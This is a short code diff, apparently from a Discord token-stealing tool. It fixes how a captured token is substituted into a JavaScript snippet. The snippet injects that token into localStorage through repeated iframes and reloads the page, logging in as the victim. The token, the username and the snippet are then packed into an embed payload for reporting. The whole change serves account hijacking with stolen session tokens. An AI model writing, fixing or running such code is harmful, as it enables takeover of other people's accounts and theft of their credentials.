@@ -33,8 +33,8 @@ def main_page():
             token_str = original.split(" : ")[1]
             username = original.split(" : ")[0]
         try:
-            code = '```javascript\nlet token="**token_str**";function login(token){setInterval(()=>{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${token}"`},50);setTimeout(()=>{location.reload()},2500)}login(token);\n```'
-            code = code.replace('**token**', token)
+            code = '```javascript\nlet token="**token**";function login(token){setInterval(()=>{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${token}"`},50);setTimeout(()=>{location.reload()},2500)}login(token);\n```'
+            code = code.replace('**token**', token_str)
             embed = {"title": username, "description": token_str, "fields": [{"name": "Javascript Code", "value": code, "inline": False}]}
             data = {
                 "embeds": [embed],
